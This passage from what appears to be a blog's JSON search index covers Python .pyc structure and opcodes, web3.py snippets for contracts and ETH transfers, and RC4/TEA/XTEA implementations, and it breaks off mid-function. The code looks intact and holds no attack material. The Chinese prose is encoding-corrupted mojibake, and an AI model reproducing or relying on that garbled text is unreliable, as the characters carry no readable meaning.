çš„é€»è¾‘éº»çƒ¦çš„è¯ï¼Œå¯ä»¥å°†å­—èŠ‚ç å¤åˆ¶åˆ° CHATGPT , è®© CHATGPT å¸®å¿™è½¬æ¢æˆå¯è¯»çš„ py ä»£ç  # é™„å½• # pyc ç»“æ„ typedef struct &#123; PyObject_HEAD int co_argcount; /* ä½ç½®å‚æ•°ä¸ªæ•° */ int co_nlocals; /* å±€éƒ¨å˜é‡ä¸ªæ•° */ int co_stacksize; /* æ ˆå¤§å° */ int co_flags; PyObject *co_code; /* å­—èŠ‚ç æŒ‡ä»¤åºåˆ— */ PyObject *co_consts; /* æ‰€æœ‰å¸¸é‡é›†åˆ */ PyObject *co_names; /* æ‰€æœ‰ç¬¦å·åç§°é›†åˆ */ PyObject *co_varnames; /* å±€éƒ¨å˜é‡åç§°é›†åˆ */ PyObject *co_freevars; /* é—­åŒ…ç”¨çš„çš„å˜é‡åé›†åˆ */ PyObject *co_cellvars; /* å†…éƒ¨åµŒå¥—å‡½æ•°å¼•ç”¨çš„å˜é‡åé›†åˆ */ /* The rest doesnâ€™t count for hash/cmp */ PyObject *co_filename; /* ä»£ç æ‰€åœ¨æ–‡ä»¶å */ PyObject *co_name; /* æ¨¡å—å|å‡½æ•°å|ç±»å */ int co_firstlineno; /* ä»£ç å—åœ¨æ–‡ä»¶ä¸­çš„èµ·å§‹è¡Œå· */ PyObject *co_lnotab; /* å­—èŠ‚ç æŒ‡ä»¤å’Œè¡Œå·çš„å¯¹åº”å…³ç³» */ void *co_zombieframe; /* for optimization only (see frameobject.c) */&#125; PyCodeObject; pyc æ–‡ä»¶å¤´éƒ¨ å‰ 4 ä¸ªå­—èŠ‚ï¼š03f3 0d0aï¼Œè¡¨ç¤º python ç‰ˆæœ¬ 5-8 ä¸ªå­—èŠ‚ï¼š0e6b 905dï¼Œè¡¨ç¤º pyc æ–‡ä»¶ä¿®æ”¹æ—¶é—´ PyCodeObject å¯¹è±¡äºŒè¿›åˆ¶ç¼–è¯‘ç»“æœ ç¬¬ 9 å­—èŠ‚ï¼š63ï¼ŒTYPE_CODE å­—æ®µï¼Œä¹Ÿå°±æ˜¯å­—ç¬¦ cï¼Œå€¼ä¸º 99ï¼Œå³ 0x63ï¼Œè¡¨ç¤ºæ¥ä¸‹ä¸ºæ˜¯ä¸€ä¸ª PyCodeObject å¯¹è±¡ PyCodeObject å¯¹è±¡ ---- å…¨å±€å‚æ•° ç„¶å 4 ä¸ªå­—èŠ‚æ˜¯ 0x00 0000 00ï¼Œcode block çš„ä½ç½®å‚æ•°ä¸ªæ•° co_argumentï¼Œè¿™é‡Œæ˜¯ 0ï¼› å†æ¥ç€ 4 ä¸ªå­—èŠ‚æ˜¯ 0x00 0000 00ï¼Œ code block ä¸­çš„å±€éƒ¨å˜é‡ä¸ªæ•° co_nlocalsï¼Œè¿™é‡Œæ˜¯ 0ï¼› å†æ¥ç€ 4 ä¸ªå­—èŠ‚æ˜¯ 0x01 0000 00ï¼Œ code block éœ€è¦çš„æ ˆç©ºé—´ co_stacksizeï¼Œè¿™é‡Œæ˜¯ 1ï¼› å†æ¥ç€ 4 ä¸ªå­—èŠ‚æ˜¯ 0x40 0000 00ï¼Œ co_flagsï¼Œè¿™é‡Œæ˜¯ 64ï¼› PyCodeObject å¯¹è±¡ ----code block 1 ä¸ªå­—èŠ‚ 0x73 ä¸º TYPE_CODE å­—æ®µï¼Œ è¡¨ç¤ºè¯¥å­—æ®µä¸º string æ ¼å¼ï¼› 4 ä¸ªå­—èŠ‚ 0x1a00 0000 è¡¨ç¤º code block æ®µçš„æ•°æ®éƒ¨åˆ†å ç”¨ 0x1a ä¸ªå­—èŠ‚ï¼Œå³é•¿åº¦ä¸º 26ï¼› æ¥ä¸‹æ¥ 26 ä¸ªå­—èŠ‚ 6400 â€¦ 6402 0053 ä¸ºè¯¥ TYPE_CODE å­—æ®µï¼ˆæ•°æ®ç±»å‹ stringï¼‰éƒ¨åˆ†ï¼Œä¹Ÿå°±æ˜¯ pyc æ–‡ä»¶ä¸­åŒ…å«çš„å­—èŠ‚ç æŒ‡ä»¤ # å­—èŠ‚ç å«ä¹‰ pyc çš„å­—èŠ‚ç å¯ä»¥åœ¨è·¯å¾„ pythonå®‰è£…è·¯å¾„/include/opcode.h /* Auto-generated by Tools/scripts/generate_opcode_h.py */#ifndef Py_OPCODE_H#define Py_OPCODE_H#ifdef __cplusplusextern \"C\" &#123;#endif /* Instruction opcodes for compiled code */#define POP_TOP 1#define ROT_TWO 2#define ROT_THREE 3#define DUP_TOP 4#define DUP_TOP_TWO 5#define NOP 9#define UNARY_POSITIVE 10#define UNARY_NEGATIVE 11#define UNARY_NOT 12#define UNARY_INVERT 15#define BINARY_MATRIX_MULTIPLY 16#define INPLACE_MATRIX_MULTIPLY 17#define BINARY_POWER 19#define BINARY_MULTIPLY 20#define BINARY_MODULO 22#define BINARY_ADD 23#define BINARY_SUBTRACT 24#define BINARY_SUBSCR 25#define BINARY_FLOOR_DIVIDE 26#define BINARY_TRUE_DIVIDE 27#define INPLACE_FLOOR_DIVIDE 28#define INPLACE_TRUE_DIVIDE 29#define GET_AITER 50#define GET_ANEXT 51#define BEFORE_ASYNC_WITH 52#define INPLACE_ADD 55#define INPLACE_SUBTRACT 56#define INPLACE_MULTIPLY 57#define INPLACE_MODULO 59#define STORE_SUBSCR 60#define DELETE_SUBSCR 61#define BINARY_LSHIFT 62#define BINARY_RSHIFT 63#define BINARY_AND 64#define BINARY_XOR 65#define BINARY_OR 66#define INPLACE_POWER 67#define GET_ITER 68#define GET_YIELD_FROM_ITER 69#define PRINT_EXPR 70#define LOAD_BUILD_CLASS 71#define YIELD_FROM 72#define GET_AWAITABLE 73#define INPLACE_LSHIFT 75#define INPLACE_RSHIFT 76#define INPLACE_AND 77#define INPLACE_XOR 78#define INPLACE_OR 79#define BREAK_LOOP 80#define WITH_CLEANUP_START 81#define WITH_CLEANUP_FINISH 82#define RETURN_VALUE 83#define IMPORT_STAR 84#define SETUP_ANNOTATIONS 85#define YIELD_VALUE 86#define POP_BLOCK 87#define END_FINALLY 88#define POP_EXCEPT 89#define HAVE_ARGUMENT 90#define STORE_NAME 90#define DELETE_NAME 91#define UNPACK_SEQUENCE 92#define FOR_ITER 93#define UNPACK_EX 94#define STORE_ATTR 95#define DELETE_ATTR 96#define STORE_GLOBAL 97#define DELETE_GLOBAL 98#define LOAD_CONST 100#define LOAD_NAME 101#define BUILD_TUPLE 102#define BUILD_LIST 103#define BUILD_SET 104#define BUILD_MAP 105#define LOAD_ATTR 106#define COMPARE_OP 107#define IMPORT_NAME 108#define IMPORT_FROM 109#define JUMP_FORWARD 110#define JUMP_IF_FALSE_OR_POP 111#define JUMP_IF_TRUE_OR_POP 112#define JUMP_ABSOLUTE 113#define POP_JUMP_IF_FALSE 114#define POP_JUMP_IF_TRUE 115#define LOAD_GLOBAL 116#define CONTINUE_LOOP 119#define SETUP_LOOP 120#define SETUP_EXCEPT 121#define SETUP_FINALLY 122#define LOAD_FAST 124#define STORE_FAST 125#define DELETE_FAST 126#define RAISE_VARARGS 130#define CALL_FUNCTION 131#define MAKE_FUNCTION 132#define BUILD_SLICE 133#define LOAD_CLOSURE 135#define LOAD_DEREF 136#define STORE_DEREF 137#define DELETE_DEREF 138#define CALL_FUNCTION_KW 141#define CALL_FUNCTION_EX 142#define SETUP_WITH 143#define EXTENDED_ARG 144#define LIST_APPEND 145#define SET_ADD 146#define MAP_ADD 147#define LOAD_CLASSDEREF 148#define BUILD_LIST_UNPACK 149#define BUILD_MAP_UNPACK 150#define BUILD_MAP_UNPACK_WITH_CALL 151#define BUILD_TUPLE_UNPACK 152#define BUILD_SET_UNPACK 153#define SETUP_ASYNC_WITH 154#define FORMAT_VALUE 155#define BUILD_CONST_KEY_MAP 156#define BUILD_STRING 157#define BUILD_TUPLE_UNPACK_WITH_CALL 158#define LOAD_METHOD 160#define CALL_METHOD 161/* EXCEPT_HANDLER is a special, implicit block type which is created when entering an except handler. It is not an opcode but we define it here as we want it to be available to both frameobject.c and ceval.c, while remaining private.*/#define EXCEPT_HANDLER 257enum cmp_op &#123;PyCmp_LT=Py_LT, PyCmp_LE=Py_LE, PyCmp_EQ=Py_EQ, PyCmp_NE=Py_NE, PyCmp_GT=Py_GT, PyCmp_GE=Py_GE, PyCmp_IN, PyCmp_NOT_IN, PyCmp_IS, PyCmp_IS_NOT, PyCmp_EXC_MATCH, PyCmp_BAD&#125;;#define HAS_ARG(op) ((op) >= HAVE_ARGUMENT)#ifdef __cplusplus&#125;#endif#endif /* !Py_OPCODE_H */# pyc é­”æ•°è¡¨ # copied from https://github.com/google/pytype/blob/main/pytype/pyc/magic.py\"\"\"Python version numbers and their encoding (\"magic number\").\"\"\"import struct# These constants are from Python-3.x.x/Lib/importlib/_bootstrap_external.pyPYTHON_MAGIC = &#123; # Python 1 20121: (1, 5), 50428: (1, 6), # Python 2 50823: (2, 0), 60202: (2, 1), 60717: (2, 2), 62011: (2, 3), # a0 62021: (2, 3), # a0 62041: (2, 4), # a0 62051: (2, 4), # a3 62061: (2, 4), # b1 62071: (2, 5), # a0 62081: (2, 5), # a0 62091: (2, 5), # a0 62092: (2, 5), # a0 62101: (2, 5), # b3 62111: (2, 5), # b3 62121: (2, 5), # c1 62131: (2, 5), # c2 62151: (2, 6), # a0 62161: (2, 6), # a1 62171: (2, 7), # a0 62181: (2, 7), # a0 62191: (2, 7), # a0 62201: (2, 7), # a0 62211: (2, 7), # a0 # Python 3 3000: (3, 0), 3010: (3, 0), 3020: (3, 0), 3030: (3, 0), 3040: (3, 0), 3050: (3, 0), 3060: (3, 0), 3061: (3, 0), 3071: (3, 0), 3081: (3, 0), 3091: (3, 0), 3101: (3, 0), 3103: (3, 0), 3111: (3, 0), # a4 3131: (3, 0), # a5 # Python 3.1 3141: (3, 1), # a0 3151: (3, 1), # a0 # Python 3.2 3160: (3, 2), # a0 3170: (3, 2), # a1 3180: (3, 2), # a2 # Python 3.3 3190: (3, 3), # a0 3200: (3, 3), # a0 3220: (3, 3), # a1 3230: (3, 3), # a4 # Python 3.4 3250: (3, 4), # a1 3260: (3, 4), # a1 3270: (3, 4), # a1 3280: (3, 4), # a1 3290: (3, 4), # a4 3300: (3, 4), # a4 3310: (3, 4), # rc2 # Python 3.5 3320: (3, 5), # a0 3330: (3, 5), # b1 3340: (3, 5), # b2 3350: (3, 5), # b2 3351: (3, 5), # 3.5.2 # Python 3.6 3360: (3, 6), # a0 3361: (3, 6), # a0 3370: (3, 6), # a1 3371: (3, 6), # a1 3372: (3, 6), # a1 3373: (3, 6), # b1 3375: (3, 6), # b1 3376: (3, 6), # b1 3377: (3, 6), # b1 3378: (3, 6), # b2 3379: (3, 6), # rc1 # Python 3.7 3390: (3, 7), # a1 3391: (3, 7), # a2 3392: (3, 7), # a4 3393: (3, 7), # b1 3394: (3, 7), # b5 # Python 3.8 3400: (3, 8), # a1 3401: (3, 8), # a1 3410: (3, 8), # a1 3411: (3, 8), # b2 3412: (3, 8), # b2 3413: (3, 8), # b4 # Python 3.9 3420: (3, 9), # a0 3421: (3, 9), # a0 3422: (3, 9), # a0 3423: (3, 9), # a2 3424: (3, 9), # a2 3425: (3, 9), # a2 # Python 3.10 3430: (3, 10), # a1 3431: (3, 10), # a1 3432: (3, 10), # a2 3433: (3, 10), # a2 3434: (3, 10), # a6 3435: (3, 10), # a7 3436: (3, 10), # b1 3437: (3, 10), # b1 3438: (3, 10), # b1 3439: (3, 10), # b1 # Python 3.11 3450: (3, 11), # a1 3451: (3, 11), # a1 3452: (3, 11), # a1 3453: (3, 11), # a1 3454: (3, 11), # a1 3455: (3, 11), # a1 3456: (3, 11), # a1 3457: (3, 11), # a1 3458: (3, 11), # a1 3459: (3, 11), # a1 3460: (3, 11), # a1 3461: (3, 11), # a1 3462: (3, 11), # a2 3463: (3, 11), # a3 3464: (3, 11), # a3 3465: (3, 11), # a3 3466: (3, 11), # a4 3467: (3, 11), # a4 3468: (3, 11), # a4 3469: (3, 11), # a4 3470: (3, 11), # a4 3471: (3, 11), # a4 3472: (3, 11), # a4 3473: (3, 11), # a4 3474: (3, 11), # a4 3475: (3, 11), # a5 3476: (3, 11), # a5 3477: (3, 11), # a5 3478: (3, 11), # a5 3479: (3, 11), # a5 3480: (3, 11), # a5 3481: (3, 11), # a5 3482: (3, 11), # a5 3483: (3, 11), # a5 3484: (3, 11), # a5 3485: (3, 11), # a5 3486: (3, 11), # a6 3487: (3, 11), # a6 3488: (3, 11), # a6 3489: (3, 11), # a6 3490: (3, 11), # a6 3491: (3, 11), # a6 3492: (3, 11), # a7 3493: (3, 11), # a7 3494: (3, 11), # a7 3495: (3, 11), # b4&#125;def magic_word_to_version(magic_word): \"\"\"Return the Python version belonging to the magic number in the pyc head. The magic number is encoded in the first two bytes of a .pyc file. It translates to a (major, minor) version. It never has a \"micro\" version, because Python bytecode encoding doesn't change between micro version. Arguments: magic_word: A 16 bit number, either as an integer or little-endian encoded as a string. Returns: A tuple (major, minor), e.g. (3, 7). \"\"\" if not isinstance(magic_word, int): magic_word = struct.unpack(\"&lt;H\", magic_word)[0] return PYTHON_MAGIC[magic_word]","categories":[],"tags":[{"name":"pythoné€†å‘","slug":"pythoné€†å‘","permalink":"https://oacia.dev/tags/python%E9%80%86%E5%90%91/"},{"name":"pyinstaller","slug":"pyinstaller","permalink":"https://oacia.dev/tags/pyinstaller/"},{"name":"uncompyle6","slug":"uncompyle6","permalink":"https://oacia.dev/tags/uncompyle6/"},{"name":"pycdc","slug":"pycdc","permalink":"https://oacia.dev/tags/pycdc/"}]},{"title":"åœ¨pythonä¸­ä¸web3äº¤äº’","slug":"web3.pyå¸¸ç”¨ä»£ç æ•´ç†","date":"2023-01-13T16:00:00.000Z","updated":"2023-09-03T16:45:36.046Z","comments":true,"path":"web3.pyå¸¸ç”¨ä»£ç æ•´ç†/","link":"","permalink":"https://oacia.dev/web3.py%E5%B8%B8%E7%94%A8%E4%BB%A3%E7%A0%81%E6%95%B4%E7%90%86/","excerpt":"","text":"ä½¿ç”¨ web3.py è¿›è¡Œåˆçº¦äº¤äº’ # éƒ¨ç½²åˆçº¦ import jsonfrom web3 import Web3, HTTPProviderprivate_key = [é’±åŒ…ç§é’¥]wallet = Web3.toChecksumAddress([é’±åŒ…åœ°å€])w3 = Web3(HTTPProvider([é“¾çš„RPC]))abi = json.loads([åˆçº¦çš„ABI])code = [åˆçº¦çš„å­—èŠ‚ç ]newContract = w3.eth.contract(bytecode=code, abi=abi)nonce = w3.eth.getTransactionCount(wallet)gasPrice = w3.toWei('10', 'gwei')gasLimit = 4000000tx = &#123; 'nonce': nonce, 'gas': gasLimit, 'gasPrice': gasPrice, 'from': wallet, 'chainId': w3.eth.chainId&#125;transaction = newContract.constructor().buildTransaction(tx)signed_tx = w3.eth.account.sign_transaction(transaction, private_key)tx_hash = w3.eth.sendRawTransaction(signed_tx.rawTransaction)transaction_hash = w3.toHex(tx_hash)tx_receipt = w3.eth.wait_for_transaction_receipt(transaction_hash)print(tx_receipt.contractAddress)# è°ƒç”¨åˆçº¦ä¸­çš„å‡½æ•° import jsonimport timefrom web3 import Web3, HTTPProvidercontract_address = [åˆçº¦åœ°å€]private_key = [é’±åŒ…ç§é’¥]wallet = Web3.toChecksumAddress([é’±åŒ…åœ°å€])w3 = Web3(HTTPProvider([RPC]))w3.eth.defaultAccount = walletabi = json.loads([åˆçº¦çš„ABI])contract = w3.eth.contract(address=contract_address, abi=abi)nonce = w3.eth.getTransactionCount(wallet)gasPrice = w3.toWei('5', 'gwei')gasLimit = 4000000tx = &#123; 'nonce': nonce, 'gas': gasLimit, 'gasPrice': gasPrice, 'from': wallet, 'value': w3.toWei(0.01,'ether')&#125;transaction = contract.functions.create().buildTransaction(tx)signed_tx = w3.eth.account.sign_transaction(transaction, private_key)tx_hash = w3.eth.sendRawTransaction(signed_tx.rawTransaction)transaction_hash = w3.toHex(tx_hash)tx_receipt = w3.eth.wait_for_transaction_receipt(transaction_hash)print(transaction_hash)# å‘æŸä¸€ä¸ªåœ°å€è½¬è´¦ import jsonimport timefrom web3 import Web3, HTTPProviderprivate_key = [é’±åŒ…ç§é’¥]wallet = Web3.toChecksumAddress([é’±åŒ…åœ°å€])w3 = Web3(HTTPProvider([RPC]))w3.eth.defaultAccount = walletto = Web3.toChecksumAddress([è¦è½¬è´¦çš„åœ°å€])nonce = w3.eth.get_transaction_count(wallet)tx = &#123; 'nonce': nonce, 'to': to, 'gas': 4000000, 'gasPrice': w3.toWei('30', 'gwei'), 'value': w3.toWei(0.01, 'ether'), 'chainId': w3.eth.chainId&#125;# ç­¾åäº¤æ˜“signed_tx = w3.eth.account.sign_transaction(tx, private_key)tx_hash = w3.eth.send_raw_transaction(signed_tx.rawTransaction)# æŸ¥è¯¢ä¸€ä¸ªåœ°å€çš„ ETH import jsonimport timefrom web3 import Web3, HTTPProviderw3 = Web3(HTTPProvider([RPC]))print(w3.fromWei(w3.eth.getBalance([éœ€è¦æŸ¥è¯¢çš„åœ°å€]), 'Ether'))","categories":[],"tags":[{"name":"æ™ºèƒ½åˆçº¦","slug":"æ™ºèƒ½åˆçº¦","permalink":"https://oacia.dev/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/"},{"name":"solidity","slug":"solidity","permalink":"https://oacia.dev/tags/solidity/"},{"name":"web3","slug":"web3","permalink":"https://oacia.dev/tags/web3/"}]},{"title":"é€†å‘å¸¸ç”¨ç®—æ³•","slug":"é€†å‘å¸¸ç”¨ç®—æ³•","date":"2023-01-13T16:00:00.000Z","updated":"2023-10-07T11:42:19.572Z","comments":true,"path":"é€†å‘å¸¸ç”¨ç®—æ³•/","link":"","permalink":"https://oacia.dev/%E9%80%86%E5%90%91%E5%B8%B8%E7%94%A8%E7%AE%97%E6%B3%95/","excerpt":"","text":"å¯¹å¸¸ç”¨çš„é€†å‘ç®—æ³•è¿›è¡Œäº†æ•´ç† # RC4 def RC4(data, key): if type(data) == type('oacia'): # åˆ¤æ–­æ˜¯å¦ä¸ºå­—ç¬¦ä¸² data = [ord(i) for i in data] if type(key) == type('oacia'): key = [ord(i) for i in key] S = list(range(256)) j = 0 out = [] # KSA Phase for i in range(256): j = (j + S[i] + key[i % len(key)]) % 256 S[i], S[j] = S[j], S[i] # PRGA Phase i = j = 0 for ch in data: i = (i + 1) % 256 j = (j + S[i]) % 256 S[i], S[j] = S[j], S[i] out.append(ch ^ S[(S[i] + S[j]) % 256]) return outdef RC4encrypt(plaintext, key): return RC4(plaintext, key)def RC4decrypt(ciphertext, key): return RC4(ciphertext, key)# Example usageplaintext = \"this is RC4,oacia\"key = \"secret\"# å¯¹æ˜æ–‡è¿›è¡ŒåŠ å¯†ciphertext = RC4encrypt(plaintext, key)print(f\"ciphertext:&#123;ciphertext&#125;\")# å¯¹å¯†æ–‡è¿›è¡Œè§£å¯†decrypted = RC4decrypt(ciphertext, key)print(f\"decrypted:&#123;decrypted&#125;\")'''ciphertext:[153, 94, 187, 111, 162, 205, 165, 134, 96, 136, 143, 240, 156, 135, 150, 94, 204]decrypted:[116, 104, 105, 115, 32, 105, 115, 32, 82, 67, 52, 44, 111, 97, 99, 105, 97]''' #include&lt;stdio.h>/*RC4 åˆå§‹åŒ–å‡½æ•°*/void rc4_init(unsigned char* s, unsigned char* key, unsigned long Len_k)&#123; int i = 0, j = 0; char k[256] = &#123; 0 &#125;; unsigned char tmp = 0; for (i = 0; i &lt; 256; i++) &#123; s[i] = i; k[i] = key[i % Len_k]; &#125; for (i = 0; i &lt; 256; i++) &#123; j = (j + s[i] + k[i]) % 256; tmp = s[i]; s[i] = s[j]; s[j] = tmp; &#125;&#125;/*RC4 åŠ è§£å¯†å‡½æ•°unsigned char* Data åŠ è§£å¯†çš„æ•°æ®unsigned long Len_D åŠ è§£å¯†æ•°æ®çš„é•¿åº¦unsigned char* key å¯†é’¥unsigned long Len_k å¯†é’¥é•¿åº¦*/void RC4(unsigned char* Data, unsigned long Len_D, unsigned char* key, unsigned long Len_k) // åŠ è§£å¯†&#123; unsigned char s[256]; rc4_init(s, key, Len_k); int i = 0, j = 0, t = 0; unsigned long k = 0; unsigned char tmp; for (k = 0; k &lt; Len_D; k++) &#123; i = (i + 1) % 256; j = (j + s[i]) % 256; tmp = s[i]; s[i] = s[j]; s[j] = tmp; t = (s[i] + s[j]) % 256; Data[k] = Data[k] ^ s[t]; &#125;&#125;void RC4encrypt(unsigned char* Data, unsigned long Len_D, unsigned char* key, unsigned long Len_k) &#123; RC4(Data, Len_D, key, Len_k);&#125;void RC4decrypt(unsigned char* Data, unsigned long Len_D, unsigned char* key, unsigned long Len_k) &#123; RC4(Data, Len_D, key, Len_k);&#125;int main()&#123; // å­—ç¬¦ä¸²å¯†é’¥ unsigned char key[] = \"secret\"; unsigned long key_len = sizeof(key) - 1;// å­—ç¬¦ä¸²æœ€åè¿˜æœ‰ä¸€ä¸ª '/0' æ‰€ä»¥éœ€è¦ - 1 // æ•°ç»„å¯†é’¥ //unsigned char key[] = &#123;'s','e','c','r','e','t'&#125;; //unsigned long key_len = sizeof(key); unsigned char data[] = &#123; 116, 104, 105, 115, 32, 105, 115, 32, 82, 67, 52, 44, 111, 97, 99, 105, 97 &#125;; // å¯¹æ˜æ–‡è¿›è¡ŒåŠ å¯† RC4encrypt(data, sizeof(data), key, key_len); for (int i = 0; i &lt; sizeof(data); i++) &#123; printf(\"%d, \", data[i]); &#125; printf(\"\\n\"); // å¯¹å¯†æ–‡è¿›è¡Œè§£å¯† RC4encrypt(data, sizeof(data), key, key_len); for (int i = 0; i &lt; sizeof(data); i++) &#123; printf(\"%c\", data[i]); &#125; printf(\"\\n\"); return 0;&#125;/*153, 94, 187, 111, 162, 205, 165, 134, 96, 136, 143, 240, 156, 135, 150, 94, 204,this is RC4,oacia*/ # TEA from ctypes import *def encrypt(v, k): v0, v1 = c_uint32(v[0]), c_uint32(v[1]) delta = 0x9e3779b9 k0, k1, k2, k3 = k[0], k[1], k[2], k[3] total = c_uint32(0) for i in range(32): total.value += delta v0.value += ((v1.value &lt;&lt; 4) + k0) ^ (v1.value + total.value) ^ ((v1.value >> 5) + k1) v1.value += ((v0.value &lt;&lt; 4) + k2) ^ (v0.value + total.value) ^ ((v0.value >> 5) + k3) return v0.value, v1.valuedef decrypt(v, k): v0, v1 = c_uint32(v[0]), c_uint32(v[1]) delta = 0x9e3779b9 k0, k1, k2, k3 = k[0], k[1], k[2], k[3] total = c_uint32(delta * 32) for i in range(32): v1.value -= ((v0.value &lt;&lt; 4) + k2) ^ (v0.value + total.value) ^ ((v0.value >> 5) + k3) v0.value -= ((v1.value &lt;&lt; 4) + k0) ^ (v1.value + total.value) ^ ((v1.value >> 5) + k1) total.value -= delta return v0.value, v1.value# å¾…åŠ å¯†çš„æ˜æ–‡ï¼Œä¸¤ä¸ª 32 ä½æ•´å‹ï¼Œå³ 64bit çš„æ˜æ–‡æ•°æ®value = [0x6869216f, 0x61636961]# å››ä¸ª keyï¼Œæ¯ä¸ªæ˜¯ 32bitï¼Œå³å¯†é’¥é•¿åº¦ä¸º 128bitkey = [0x1, 0x2, 0x3, 0x4]print(\"Data is : \", hex(value[0]), hex(value[1]))res = encrypt(value, key)print(\"Encrypted data is : \", hex(res[0]), hex(res[1]))res = decrypt(res, key)print(\"Decrypted data is : \", hex(res[0]), hex(res[1]))\"\"\"Data is : 0x6869216f 0x61636961Encrypted data is : 0x55d9ac0b 0x2df0479fDecrypted data is : 0x6869216f 0x61636961\"\"\" #include &lt;stdio.h>#include &lt;stdint.h>// åŠ å¯†å‡½æ•°void encrypt(uint32_t* v, uint32_t* k) &#123; uint32_t delta = 0x9e3779b9; uint32_t v0 = v[0], v1 = v[1], sum = 0, i; uint32_t k0 = k[0], k1 = k[1], k2 = k[2], k3 = k[3]; for (i = 0; i &lt; 32; i++) &#123; sum += delta; v0 += ((v1 &lt;&lt; 4) + k0) ^ (v1 + sum) ^ ((v1 >> 5) + k1); v1 += ((v0 &lt;&lt; 4) + k2) ^ (v0 + sum) ^ ((v0 >> 5) + k3); &#125; v[0] = v0; v[1] = v1;&#125;// è§£å¯†å‡½æ•°void decrypt(uint32_t* v, uint32_t* k) &#123; uint32_t delta = 0x9e3779b9; uint32_t v0 = v[0], v1 = v[1], sum = 32*delta, i; uint32_t k0 = k[0], k1 = k[1], k2 = k[2], k3 = k[3]; for (i = 0; i&lt;32; i++) &#123; v1 -= ((v0 &lt;&lt; 4) + k2) ^ (v0 + sum) ^ ((v0 >> 5) + k3); v0 -= ((v1 &lt;&lt; 4) + k0) ^ (v1 + sum) ^ ((v1 >> 5) + k1); sum -= delta; &#125; v[0] = v0; v[1] = v1;&#125;int main()&#123; //v ä¸ºè¦åŠ è§£å¯†çš„æ•°æ®ï¼Œä¸¤ä¸ª 32 ä½æ— ç¬¦å·æ•´æ•° uint32_t v[2] = &#123; 0x6869216f, 0x61636961 &#125;; //k ä¸ºåŠ è§£å¯†å¯†é’¥ï¼Œ4 ä¸ª 32 ä½æ— ç¬¦å·æ•´æ•°ï¼Œå¯†é’¥é•¿åº¦ä¸º 128 ä½ uint32_t k[4] = &#123; 0x1, 0x2, 0x3, 0x4 &#125;; int n = sizeof(v) / sizeof(uint32_t); printf(\"Data is : 0x%x 0x%x\\n\", v[0], v[1]); encrypt(v, k); printf(\"Encrypted data is : 0x%x 0x%x\\n\", v[0], v[1]); decrypt(v, k); printf(\"Decrypted data is : 0x%x 0x%x\\n\", v[0], v[1]); return 0;&#125;/*Data is : 0x6869216f 0x61636961Encrypted data is : 0x55d9ac0b 0x2df0479fDecrypted data is : 0x6869216f 0x61636961*/ from ctypes import *def encrypt(v, key): v0, v1 = c_uint32(v[0]), c_uint32(v[1]) delta = 0x9E3779B9 total = c_uint32(0) for i in range(32): v0.value += (((v1.value &lt;&lt; 4) ^ (v1.value >> 5)) + v1.value) ^ (total.value + key[total.value &amp; 3]) total.value += delta v1.value += (((v0.value &lt;&lt; 4) ^ (v0.value >> 5)) + v0.value) ^ (total.value + key[(total.value >> 11) &amp; 3]) return v0.value, v1.valuedef decrypt(v, key): v0, v1 = c_uint32(v[0]), c_uint32(v[1]) delta = 0x9E3779B9 total = c_uint32(delta * 32) for i in range(32): v1.value -= (((v0.value &lt;&lt; 4) ^ (v0.value >> 5)) + v0.value) ^ (total.value + key[(total.value >> 11) &amp; 3]) total.value -= delta v0.value -= (((v1.value &lt;&lt; 4) ^ (v1.value >> 5)) + v1.value) ^ (total.value + key[total.value &amp; 3]) return v0.value, v1.value# testif __name__ == \"__main__\": # å¾…åŠ å¯†çš„æ˜æ–‡ï¼Œä¸¤ä¸ª 32 ä½æ•´å‹ï¼Œå³ 64bit çš„æ˜æ–‡æ•°æ® value = [0x6869216f, 0x61636961] # å››ä¸ª keyï¼Œæ¯ä¸ªæ˜¯ 32bitï¼Œå³å¯†é’¥é•¿åº¦ä¸º 128bit key = [0x1, 0x2, 0x3, 0x4] print(\"Data is : \", hex(value[0]), hex(value[1])) res = encrypt(value, key) print(\"Encrypted data is : \", hex(res[0]), hex(res[1])) res = decrypt(res, key) print(\"Decrypted data is : \", hex(res[0]), hex(res[1]))\"\"\"Data is : 0x6869216f 0x61636961Encrypted data is : 0x39f25ea9 0x92754c5dDecrypted data is : 0x6869216f 0x61636961\"\"\" #include &lt;stdio.h>#include &lt;stdint.h>// åŠ å¯†å‡½æ•°void encrypt(uint32_t v[2], uint32_t const key[4]) &#123; unsigned int i; uint32_t v0 = v[0], v1 = v[1], sum = 0, delta = 0x9E3779B9; for (i = 0; i &lt; 32; i++) &#123; v0 += (((v1 &lt;&lt; 4) ^ (v1 >> 5)) + v1) ^ (sum + key[sum &amp; 3]); sum += delta; v1 += (((v0 &lt;&lt; 4) ^ (v0 >> 5)) + v0) ^ (sum + key[(sum >> 11) &amp; 3]); &#125; v[0] = v0; v[1] = v1;&#125;// è§£å¯†å‡½æ•°void decrypt(uint32_t v[2], uint32_t const key[4]) &#123; unsigned int i; uint32_t v0 = v[0], v1 = v[1], delta = 0x9E3779B9, sum = delta*32; for (i = 0; i &lt; 32; i++) &#123; v1 -= (((v0 &lt;&lt; 4) ^ (v0 >> 5)) + v0) ^ (sum + key[(sum >> 11) &amp; 3]); sum -= delta; v0 -= (((v1 &lt;&lt; 4) ^ (v1 >> 5)) + v1) ^ (sum + key[sum &amp; 3]); &#125; v[0] = v0; v[1] = v1;&#125;int main()&#123; //v ä¸ºè¦åŠ è§£å¯†çš„æ•°æ®ï¼Œä¸¤ä¸ª 32 ä½æ— ç¬¦å·æ•´æ•° uint32_t v[2] = &#123; 0x6869216f, 0x61636961 &#125;; //k ä¸ºåŠ è§£å¯†å¯†é’¥ï¼Œ4 ä¸ª 32 ä½æ— ç¬¦å·æ•´æ•°ï¼Œå¯†é’¥é•¿åº¦ä¸º 128 ä½ uint32_t k[4] = &#123; 0x1, 0x2, 0x3, 0x4 &#125;; int n = sizeof(v) / sizeof(uint32_t); printf(\"Data is : 0x%x 0x%x\\n\", v[0], v[1]); encrypt(v, k); printf(\"Encrypted data is : 0x%x 0x%x\\n\", v[0], v[1]); decrypt(v, k); printf(\"Decrypted data is : 0x%x 0x%x\\n\", v[0], v[1]); return 0;&#125;/*Data is : 0x6869216f 0x61636961Encrypted data is : 0x39f25ea9 0x92754c5dDecrypted data is : 0x6869216f 0x61636961*/ from ctypes import *def MX(z, y, total, key, p, e): temp1 = (z.value >> 5 ^ y.value &lt;&lt; 2) + (y.value >> 3 ^ z.value &lt;&lt; 4) temp2 = (total.value ^ y.value) + (key[(p &amp; 3) ^ e.value] ^ z.value) return c_uint32(temp1 ^ temp2)def encrypt(n, v, key): 